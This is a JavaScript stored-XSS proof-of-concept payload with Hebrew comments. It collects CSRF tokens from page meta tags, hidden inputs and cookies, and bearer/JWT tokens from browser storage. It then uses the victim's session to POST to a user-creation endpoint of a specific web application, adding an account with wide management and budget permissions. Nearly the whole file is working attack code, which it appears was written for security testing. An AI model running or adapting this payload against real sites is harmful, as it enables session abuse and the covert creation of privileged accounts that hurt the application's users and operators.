// ===== helpers =====
const getCookie = (n) => document.cookie.split('; ').find(r => r.startsWith(n+'='))?.split('=')[1];

function findCsrfHeader() {
  // meta tags
  const metas = [
    ['csrf-token', 'X-CSRF-Token'],
    ['xsrf-token', 'X-XSRF-TOKEN'],
    ['_csrf',      'X-CSRF-Token'],
    ['request-verification-token','RequestVerificationToken'],
  ];
  for (const [name, header] of metas) {
    const el = document.querySelector(`meta[name="${name}"]`);
    if (el?.content) return [header, el.content];
  }
  // hidden inputs
  const inputs = [
    ['_csrf','X-CSRF-Token'],
    ['csrfmiddlewaretoken','X-CSRFToken'],
    ['__RequestVerificationToken','RequestVerificationToken'],
  ];
  for (const [name, header] of inputs) {
    const el = document.querySelector(`input[name="${name}"]`);
    if (el?.value) return [header, el.value];
  }
  // cookies נפוצים (Laravel/Django)
  const cookieMap = [['XSRF-TOKEN','X-XSRF-TOKEN'], ['csrftoken','X-CSRFToken']];
  for (const [c, header] of cookieMap) {
    const v = getCookie(c);
    if (v) return [header, decodeURIComponent(v)];
  }
  return null;
}

function findBearer() {
  const stores = [localStorage, sessionStorage];
  const hints = ['token','auth','access','jwt','bearer','authorization'];
  const jwtRe = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/;
  for (const store of stores) {
    try {
      for (let i=0; i<store.length; i++) {
        const k = store.key(i) || '';
        const v = store.getItem(k) || '';
        if (!v) continue;
        const lk = k.toLowerCase();
        if (hints.some(h => lk.includes(h))) {
          if (v.startsWith('Bearer ')) return v;
          if (jwtRe.test(v) || v.startsWith('eyJ')) return 'Bearer ' + v;
        }
      }
    } catch {}
  }
  return null;
}

// ===== הביצוע =====
(async () => {
  try {
    const headers = new Headers();
    headers.set('Content-Type', 'application/json;charset=UTF-8');
    headers.set('Accept', '*/*');
    headers.set('X-Requested-With', 'XMLHttpRequest');

    const csrf = findCsrfHeader();
    if (csrf) headers.set(csrf[0], csrf[1]);

    const bearer = findBearer(); // אם האפליקציה דורשת Authorization
    if (bearer) headers.set('Authorization', bearer);

    // כתובת היעד המדויקת שנתת (same-origin)
    const url = '/systems/13123/systems/users/create';

    // גוף הבקשה — לפי הדוגמה שלך (כולל system: 16175 כפי שסיפקת)
    const body = {
      "system":16175,"status":1,"firstName":"stored","phone":"6660639",
      "lastName":"xss","prefix":"050","userEmail":"xss@gmail.com","settings":1,
      "usersManagement":1,"reports":1,"budgetManagement":1,"automatedSystems":1,
      "crsSystems":1,"teamActivity":1,"view_other_crs_managers":0,"personManageList":1,
      "personViewList":1,"subsystems_report":[],"subsystems_send":[],"dailyVouchersAmount":null,
      "monthlyVouchersAmount":null,"quarterlyVouchersAmount":null,"yearlyVouchersAmount":null,
      "noTimeLimitBudget":null,"preSave":{"status":1,"userEmail":"","role_id":"","firstName":"",
      "lastName":"","fullPhone":"","settings":0,"usersManagement":0,"reports":0,"budgetManagement":0,
      "automatedSystems":0,"crsSystems":0,"activity":0,"teamActivity":0,"personManageList":0,
      "personViewList":0,"subsystems_send":[],"dailyVouchersAmount":null,"monthlyVouchersAmount":null,
      "quarterlyVouchersAmount":null,"yearlyVouchersAmount":null,"noTimeLimitBudget":null,
      "view_other_crs_managers":0,"subsystems_report":[]},"role_id":14,"activity":1,
      "fullPhone":"0506660639","roles":[14],"userName":"xss@gmail.com"
    };

    const res = await fetch(url, {
      method: 'POST',
      credentials: 'include',   // שולח cookies של המשתמש
      headers,
      body: JSON.stringify(body)
    });

    console.log('[XSS PoC] create-user status:', res.status);
    try { console.log('[XSS PoC] response:', (await res.text()).slice(0,500)); } catch {}

  } catch (e) {
    console.error('[XSS PoC] error:', e);
  }
})();
